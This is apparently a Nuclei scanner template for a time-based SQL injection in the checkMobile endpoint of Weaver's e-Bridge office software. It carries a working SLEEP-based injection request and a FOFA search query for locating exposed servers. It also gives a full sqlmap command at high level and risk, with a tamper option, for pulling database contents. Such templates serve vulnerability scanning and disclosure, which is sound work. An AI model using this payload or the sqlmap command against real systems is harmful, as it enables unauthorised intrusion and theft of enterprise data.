id: weaver-ebridge-checkMobile-sqli
info:
  name: 泛微云桥 e-Bridge checkMobile - sqli
  author: leadlife
  severity: high
  description: 泛微云桥e-Bridge 是一款办公自动化工具，主要提供文档管理、流程管理、协同办公、知识管理和移动办公等功能。它的目标是将企业内部的各种业务流程数字化，并通过云端技术实现跨部门、跨地域的协同办公和信息共享。该产品 checkMobile接口存在SQL注入漏洞，通过此漏洞攻击者可获取企业数据库敏感数据。
  reference: 
    - https://github.com/wy876/POC/blob/main/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AE%E4%BA%91%E6%A1%A5e-Bridge%E7%B3%BB%E7%BB%9FcheckMobile%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
  metadata:
    verified: true
    fofa-query: app="泛微-云桥e-Bridge"
    tips: just * mobile to sqli.txt
    sqlmap: sqlmap -r sqli.txt --level 5 --tamper=space2comment --risk 3 --batch --dbms=mysql --technique=T
  tags: 2024,sqli,weaver,ebridge,time

http:
  - raw:  
      - |
        @timeout: 15s
        POST /taste/checkMobile?company=1&mobile=1%27%20AND%20(SELECT%208094%20FROM%20(SELECT(SLEEP(6-(IF(18015%3E3469,0,4)))))mKjk)%20OR%20%27KQZm%27=%27REcX&openid=1&source=1&userName=1 HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
        Accept-Encoding: gzip, deflate, br, zstd
        Accept: */*
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 0
      
    matchers:
      - type: dsl
        dsl:
          - contains_all(body,'Bridge','checkMobile')
          - status_code == 200
          - duration >= 5 && duration < 9
        condition: and